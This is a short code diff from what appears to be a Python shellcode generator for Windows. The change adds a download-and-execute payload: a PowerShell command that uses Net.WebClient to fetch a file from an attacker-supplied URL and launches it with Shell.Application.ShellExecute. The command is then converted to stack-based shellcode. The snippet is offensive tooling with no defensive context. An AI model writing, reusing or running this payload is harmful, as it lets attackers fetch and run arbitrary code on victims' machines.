@@ -259,7 +259,10 @@ def generator( choose=None, shellcode=None, COMMAND=None, FILE=None, ip=None, po
 			from .Windows import downloadandexecute
 			from .stackconvert import rawSTR
 			from .stackconvert import stackconvertSTR
-			return downloadandexecute.downANDexecute( rawSTR(URL), stackconvertSTR(FILENAME, True))
+			if FILENAME == "None":
+				FILENAME = URL.split("/")[-1]
+			payload = '''powershell -command "& { (New-Object Net.WebClient).DownloadFile('%s', '%s') ;(New-Object -com Shell.Application).ShellExecute('%s');}"''' % (URL,FILENAME,FILENAME)
+			return downloadandexecute.downANDexecute( stackconvertSTR(payload))
 		
 		elif shellcode == "exec":
 			from .Windows.execc import WinExec
